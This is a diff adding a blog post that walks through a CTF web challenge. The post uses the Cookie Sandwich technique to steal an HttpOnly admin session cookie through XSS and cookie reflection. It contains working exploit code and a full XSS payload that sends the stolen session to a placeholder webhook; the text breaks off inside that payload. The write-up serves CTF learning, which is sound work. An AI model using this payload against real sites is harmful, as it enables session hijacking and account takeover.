@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Kuwait Cyber League CTF (2025) | m7eesn blog</title>
+<meta name="title" content="Kuwait Cyber League CTF (2025)" />
+<meta name="description" content="My team and I participated in the Kuwait Cyber League CTF held on October 18, 2025. The competition featured a variety of challenges across multiple categories,
+We unfortunately, did not secure the first place, however we managed to place 2nd overall, due to various factors including our main binary exploitation/reverse engineering expert not being able to participate due to personal reasons. We have solved 10 challenges out of the 14 available, which is respectable considering the technical challenges the platform were having." />
+<meta name="keywords" content="" />
+
+
+<meta property="og:url" content="https://blog.looter.dev/blog/2025-10-18-kuwait-cyber-league-ctf-2025/">
+  <meta property="og:site_name" content="m7eesn blog">
+  <meta property="og:title" content="Kuwait Cyber League CTF (2025)">
+  <meta property="og:description" content="My team and I participated in the Kuwait Cyber League CTF held on October 18, 2025. The competition featured a variety of challenges across multiple categories, We unfortunately, did not secure the first place, however we managed to place 2nd overall, due to various factors including our main binary exploitation/reverse engineering expert not being able to participate due to personal reasons. We have solved 10 challenges out of the 14 available, which is respectable considering the technical challenges the platform were having.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2025-10-18T09:00:00+00:00">
+    <meta property="article:modified_time" content="2025-10-18T09:00:00+00:00">
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Kuwait Cyber League CTF (2025)">
+  <meta name="twitter:description" content="My team and I participated in the Kuwait Cyber League CTF held on October 18, 2025. The competition featured a variety of challenges across multiple categories, We unfortunately, did not secure the first place, however we managed to place 2nd overall, due to various factors including our main binary exploitation/reverse engineering expert not being able to participate due to personal reasons. We have solved 10 challenges out of the 14 available, which is respectable considering the technical challenges the platform were having.">
+
+
+
+
+  <meta itemprop="name" content="Kuwait Cyber League CTF (2025)">
+  <meta itemprop="description" content="My team and I participated in the Kuwait Cyber League CTF held on October 18, 2025. The competition featured a variety of challenges across multiple categories, We unfortunately, did not secure the first place, however we managed to place 2nd overall, due to various factors including our main binary exploitation/reverse engineering expert not being able to participate due to personal reasons. We have solved 10 challenges out of the 14 available, which is respectable considering the technical challenges the platform were having.">
+  <meta itemprop="datePublished" content="2025-10-18T09:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-10-18T09:00:00+00:00">
+  <meta itemprop="wordCount" content="1935">
+  <meta itemprop="keywords" content="Ctf">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  :root {
+    --width: 720px;
+    --font-main: Verdana, sans-serif;
+    --font-secondary: Verdana, sans-serif;
+    --font-scale: 1em;
+    --background-color: #fff;
+    --heading-color: #222;
+    --text-color: #444;
+    --link-color: #3273dc;
+    --visited-color: #8b6fcb;
+    --blockquote-color: #222;
+  }
+
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --background-color: #01242e;
+      --heading-color: #eee;
+      --text-color: #ddd;
+      --link-color: #8cc2dd;
+      --visited-color: #8b6fcb;
+      --blockquote-color: #ccc;
+    }
+  }
+
+  body {
+    font-family: var(--font-secondary);
+    font-size: var(--font-scale);
+    margin: auto;
+    padding: 20px;
+    max-width: var(--width);
+    text-align: left;
+    background-color: var(--background-color);
+    word-wrap: break-word;
+    overflow-wrap: break-word;
+    line-height: 1.5;
+    color: var(--text-color);
+  }
+
+  h1,
+  h2,
+  h3,
+  h4,
+  h5,
+  h6 {
+    font-family: var(--font-main);
+    color: var(--heading-color);
+  }
+
+  a {
+    color: var(--link-color);
+    cursor: pointer;
+    text-decoration: none;
+  }
+
+  a:hover {
+    text-decoration: underline;
+  }
+
+  nav a {
+    margin-right: 8px;
+  }
+
+  strong,
+  b {
+    color: var(--heading-color);
+  }
+
+  button {
+    margin: 0;
+    cursor: pointer;
+  }
+
+  time {
+    font-family: monospace;
+    font-style: normal;
+    font-size: 15px;
+  }
+
+  main {
+    line-height: 1.6;
+  }
+
+  table {
+    width: 100%;
+  }
+
+  hr {
+    border: 0;
+    border-top: 1px dashed;
+  }
+
+  img {
+    max-width: 100%;
+  }
+
+  code {
+    font-family: monospace;
+    padding: 2px;
+    border-radius: 3px;
+  }
+
+  blockquote {
+    border-left: 1px solid #999;
+    color: var(--blockquote-color);
+    padding-left: 20px;
+    font-style: italic;
+  }
+
+  footer {
+    padding: 25px 0;
+    text-align: center;
+  }
+
+  .title:hover {
+    text-decoration: none;
+  }
+
+  .title h1 {
+    font-size: 1.5em;
+  }
+
+  .inline {
+    width: auto !important;
+  }
+
+  .highlight,
+  .code {
+    border-radius: 3px;
+    margin-block-start: 1em;
+    margin-block-end: 1em;
+    overflow-x: auto;
+  }
+
+   
+  ul.blog-posts {
+    list-style-type: none;
+    padding: unset;
+  }
+
+  ul.blog-posts li {
+    display: flex;
+  }
+
+  ul.blog-posts li span {
+    flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+    color: var(--visited-color);
+  }
+
+</style>
+<style>
+    div.highlight pre {
+        padding: 1em !important;
+    }
+</style></head>
+
+<body>
+  <header><a href="https://blog.looter.dev/" class="title">
+  <h2>m7eesn blog</h2>
+</a>
+<nav>
+</nav>
+</header>
+  <main>
+
+<h1>Kuwait Cyber League CTF (2025)</h1>
+<p>
+  <i>
+    <time datetime='2025-10-18'>
+      18 Oct, 2025
+    </time>
+  </i>
+</p>
+
+<content>
+  <p>My team and I participated in the Kuwait Cyber League CTF held on October 18, 2025. The competition featured a variety of challenges across multiple categories,
+We unfortunately, did not secure the first place, however we managed to place 2nd overall, due to various factors including our main binary exploitation/reverse engineering expert not being able to participate due to personal reasons. We have solved 10 challenges out of the 14 available, which is respectable considering the technical challenges the platform were having.</p>
+<h1 id="bottle---hard-challenge-writeup">Bottle - Hard Challenge Writeup</h1>
+<p>This challenge was particularly interesting and educational as i was not deeply familiar with the <code>Cookie Sandwich</code> technique prior to this CTF. It was a great opportunity to learn about this and understand its practical applications.</p>
+<h2 id="challenge-overview">Challenge Overview</h2>
+<p><strong>Challenge Name:</strong> Bottle <a href="downloads/bottle-hard-chall.zip">Download link</a>.</p>
+<p><strong>Difficulty:</strong> Hard.</p>
+<p><strong>Challenge Hint:</strong> &ldquo;HttpOnly cookies can&rsquo;t be read by JavaScript, so they can&rsquo;t be stolen via XSS, right?&rdquo;</p>
+<p>The challenge presented a Bottle web application with note-taking functionality and an admin bot that visits reported notes. The goal was to steal the admin&rsquo;s HTTPOnly session cookie and retrieve the flag from <code>/admin/flag</code>.</p>
+<h2 id="initial-analysis">Initial Analysis</h2>
+<h3 id="application-architecture">Application Architecture</h3>
+<ol>
+<li><strong>Web Application</strong> - Bottle framework (Python).</li>
+<li><strong>Admin Bot</strong> - Puppeteer bot that authenticates as admin and visits reported notes</li>
+<li><strong>Key Endpoints:</strong>
+<ul>
+<li><code>/note/add-note</code> - Create notes with user content.</li>
+<li><code>/note/&lt;id&gt;</code> - View note preview.</li>
+<li><code>/admin/flag</code> - Protected endpoint requiring admin authentication.</li>
+<li><code>/bot</code> - Report notes to admin bot.</li>
+<li><code>/set-lang/&lt;lang&gt;</code> - Set language cookie.</li>
+<li><code>/about</code> - About page.</li>
+</ul>
+</li>
+</ol>
+<h3 id="security-features-identified">Security Features Identified</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Custom cookie implementation (app.py lines 100-147)</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_custom_cookie</span>(response_obj, name, value, signed<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, <span style="color:#f92672">**</span>kwargs):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># NO ESCAPING of cookie values!</span>
+</span></span><span style="display:flex;"><span>    cookie_parts <span style="color:#f92672">=</span> [<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74">=</span><span style="color:#e6db74">{</span>value<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ... builds Set-Cookie header directly</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Session cookies set with HttpOnly flag (app.py line 202)</span>
+</span></span><span style="display:flex;"><span>set_custom_cookie(response, <span style="color:#e6db74">&#39;session&#39;</span>, session_id, signed<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, httponly<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, path<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># IP-based access control (app.py lines 305-306)</span>
+</span></span><span style="display:flex;"><span>real_ip <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>remote_addr
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> real_ip <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span> <span style="color:#f92672">or</span> real_ip <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;::1&#39;</span> <span style="color:#f92672">or</span> real_ip<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;127.&#39;</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Access denied from localhost.&#34;</span>
+</span></span></code></pre></div><h3 id="vulnerabilities-found">Vulnerabilities Found</h3>
+<ol>
+<li><strong>XSS Vulnerability</strong> - <code>note_preview.tpl</code> line 23:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;note-preview&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>{% raw %}
+</span></span><span style="display:flex;"><span>    {{!note[&#39;content&#39;]}}  <span style="color:#75715e">&lt;!-- Unescaped rendering! --&gt;</span>
+</span></span><span style="display:flex;"><span>{% endraw %}
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span></code></pre></div><ol start="2">
+<li><strong>Cookie Reflection</strong> - Multiple templates render lang cookie:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{{lang}}&#34;</span>&gt;  <span style="color:#75715e">&lt;!-- Lang cookie reflected in HTML --&gt;</span>
+</span></span></code></pre></div><ol start="3">
+<li><strong>Custom Cookie Implementation</strong> - No value escaping in <code>set_custom_cookie()</code></li>
+</ol>
+<h2 id="the-problem-httponly-cookie-protection">The Problem: HTTPOnly Cookie Protection</h2>
+<p>The admin&rsquo;s session cookie was set with the <code>HttpOnly</code> flag, which prevents JavaScript from accessing it via <code>document.cookie</code>. Traditional XSS attacks cannot steal HTTPOnly cookies directly.</p>
+<p><strong>Bot Configuration (bot.js):</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">APPURL</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>[<span style="color:#e6db74">&#39;APPURL&#39;</span>] <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;http://127.0.0.1:8081&#34;</span>
+</span></span></code></pre></div><p>The bot always visits from <code>127.0.0.1</code>, triggering the IP restriction on <code>/admin/flag</code>:</p>
+<pre tabindex="0"><code>&#34;Access denied from localhost.&#34;
+</code></pre><h2 id="research-phase">Research Phase</h2>
+<h3 id="initial-attempts-failed">Initial Attempts (Failed)</h3>
+<ol>
+<li><strong>Direct fetch() to /admin/flag</strong> - HTTPOnly cookies sent automatically, but IP check blocked access</li>
+<li><strong>X-Forwarded-For manipulation</strong> - <code>RemoveProxyHeadersMiddleware</code> stripped all proxy headers</li>
+<li><strong>Basic Cookie Sandwich</strong> - Bottle&rsquo;s cookie parser properly handled standard cookie formats</li>
+</ol>
+<h3 id="key-research-sources">Key Research Sources</h3>
+<p>After hitting roadblocks, we researched the <code>Cookie Sandwich</code> technique more deeply:</p>
+<ol>
+<li>
+<p><strong>PortSwigger Research:</strong> <a href="https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique">Stealing HttpOnly cookies via legacy cookie parsing</a></p>
+<ul>
+<li>Introduced the concept of cookie parsing discrepancies</li>
+<li>Explained how <code>$Version</code> cookie triggers RFC2109 parsing mode</li>
+</ul>
+</li>
+<li>
+<p><strong>Medium Article:</strong> <a href="https://medium.com/@mysticraganork66/heres-the-polished-write-up-of-the-cookie-sandwich-technique-a3d921c8aa23">Cookie Sandwich Technique Writeup</a></p>
+<ul>
+<li>Provided practical exploitation examples</li>
+<li>Demonstrated cookie ordering with path manipulation</li>
+<li>Showed how quoted cookie values can capture subsequent cookies</li>
+</ul>
+</li>
+</ol>
+<h3 id="the-cookie-sandwich-technique">The Cookie Sandwich Technique</h3>
+<p>The attack exploits differences between:</p>
+<ul>
+<li>How browsers send cookies</li>
+<li>How servers parse cookies (especially with RFC2109 mode)</li>
+</ul>
+<p><strong>Key Concepts:</strong></p>
+<ol>
+<li><strong>$Version Cookie</strong> - Switches server to RFC2109 parsing mode</li>
+<li><strong>Quoted Cookie Values</strong> - RFC2109 allows quoted values that can contain semicolons</li>
+<li><strong>Cookie Ordering</strong> - Browsers send cookies ordered by path specificity (most specific first)</li>
+<li><strong>Cookie Reflection</strong> - Need an endpoint that reflects cookie values in readable form</li>
+</ol>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="step-1-understanding-cookie-parsing">Step 1: Understanding Cookie Parsing</h3>
+<p>We tested Bottle&rsquo;s cookie parsing behavior:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Test cases</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;lang=test; session=secret&#39;</span>              <span style="color:#75715e"># Parses correctly</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;lang=&#34;test; session=secret&#39;</span>             <span style="color:#75715e"># Returns None (malformed)</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;lang=&#34;test&#34;; session=secret&#39;</span>            <span style="color:#75715e"># Parses correctly</span>
+</span></span></code></pre></div><p>The key insight: Bottle supports RFC2109 quoted cookie values when <code>$Version</code> is present!</p>
+<h3 id="step-2-cookie-sandwich-setup">Step 2: Cookie Sandwich Setup</h3>
+<p>The attack creates a &ldquo;sandwich&rdquo; of cookies where the HTTPOnly session cookie gets trapped inside a quoted cookie value:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// Step 1: Set $Version=1 for RFC2109 mode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$Version=1; domain=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hostname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;; path=/about;&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Step 2: Set lang with opening quote (more specific path)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;lang=&#34;capture; domain=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hostname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;; path=/about;&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Step 3: Set dummy with closing quote (less specific path)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;dummy=end&#34;; domain=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hostname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;; path=/;&#39;</span>;
+</span></span></code></pre></div><p><strong>Cookie Ordering:</strong> Browsers send cookies with more specific paths first:</p>
+<ol>
+<li>Cookies with <code>path=/about</code> are sent first</li>
+<li>Cookies with <code>path=/</code> are sent last</li>
+</ol>
+<p><strong>Resulting Cookie Header:</strong></p>
+<pre tabindex="0"><code>Cookie: $Version=1; lang=&#34;capture; session=HTTPONLY_VALUE|timestamp|sig; dummy=end&#34;
+</code></pre><h3 id="step-3-cookie-reflection">Step 3: Cookie Reflection</h3>
+<p>When the server calls <code>request.get_cookie('lang')</code> with RFC2109 parsing enabled:</p>
+<ul>
+<li>It treats the quoted value as a single string</li>
+<li>The entire content between quotes is returned: <code>&quot;capture; session=VALUE; dummy=end&quot;</code></li>
+</ul>
+<p>This value gets reflected in the HTML template:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;capture; session=2cd248da60bad57e26a4c8b85d836a6c|1760797849|_sJnFluwi3S1EVnMqBcP1ifSlHtkH1tREJ4E4ppexeI; dummy=end&#34;</span>&gt;
+</span></span></code></pre></div><p>JavaScript can now read this from the DOM</p>
+<h3 id="step-4-session-extraction">Step 4: Session Extraction</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// Fetch page with reflected cookie
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/about&#39;</span>, {<span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;include&#39;</span>});
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Extract lang attribute containing the session cookie
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">match</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">html</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/&lt;html lang=&#34;([^&#34;]*)&#34;/</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">langValue</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">match</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">match</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Parse out the session cookie
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">sessionMatch</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">langValue</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/session=([^;]+)/</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">sessionCookie</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sessionMatch</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">sessionMatch</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>;
+</span></span></code></pre></div><p><strong>Webhook Result:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;stolen_session&#34;</span>: <span style="color:#e6db74">&#34;2cd248da60bad57e26a4c8b85d836a6c|1760797849|_sJnFluwi3S1EVnMqBcP1ifSlHtkH1tREJ4E4ppexeI&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;full_lang_value&#34;</span>: <span style="color:#e6db74">&#34;capture; session=2cd248da60bad57e26a4c8b85d836a6c|1760797849|_sJnFluwi3S1EVnMqBcP1ifSlHtkH1tREJ4E4ppexeI; lang=en; dummy=end&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="step-5-bypassing-ip-restriction">Step 5: Bypassing IP Restriction</h3>
+<p>With the stolen admin session cookie, we can now authenticate from our own IP (not localhost):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BASE_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://your-challenge.url&#34;</span>
+</span></span><span style="display:flex;"><span>stolen_session <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;2cd248da60bad57e26a4c8b85d836a6c|1760797849|_sJnFluwi3S1EVnMqBcP1ifSlHtkH1tREJ4E4ppexeI&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>set(<span style="color:#e6db74">&#39;session&#39;</span>, stolen_session)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>BASE_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/admin/flag&#34;</span>)
+</span></span></code></pre></div><p><strong>Result:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Status Code: 200
+</span></span><span style="display:flex;"><span>Flag{QCFAMmFEaHhWYW95SmR5TFlncjhKY2RxMTJ3STNYUmkva1hOL1ovd2d4YVZnemNESjJBSDd3NFFlR09hTHVIYzdXNENYMm9kNllIYzE5V2FsMEc4a21Ra1E9PWRhNDgxOTQ1ZWU1MDg1ZWM=}
+</span></span></code></pre></div><h2 id="complete-exploit-chain">Complete Exploit Chain</h2>
+<h3 id="xss-payload">XSS Payload</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>(<span style="color:#66d9ef">async</span>()=&gt;{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Cookie Sandwich Attack
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$Version=1; domain=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hostname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;; path=/about;&#39;</span>;
+</span></span><span style="display:flex;"><span>        document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;lang=&#34;capture; domain=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hostname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;; path=/about;&#39;</span>;
+</span></span><span style="display:flex;"><span>        document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;dummy=end&#34;; domain=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hostname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;; path=/;&#39;</span>;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#a6e22e">r</span>=&gt;<span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">r</span>, <span style="color:#ae81ff">400</span>));
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Reflect cookies via /about page
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/about&#39;</span>, {<span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;include&#39;</span>});
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">match</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">html</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/&lt;html lang=&#34;([^&#34;]*)&#34;/</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">langValue</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">match</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">match</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Extract and exfiltrate session
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">sessionMatch</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">langValue</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/session=([^;]+)/</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">sessionCookie</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sessionMatch</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">sessionMatch</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;WEBHOOK_URL&#39;</span>,{
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span>{<span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;application/json&#39;</span>},
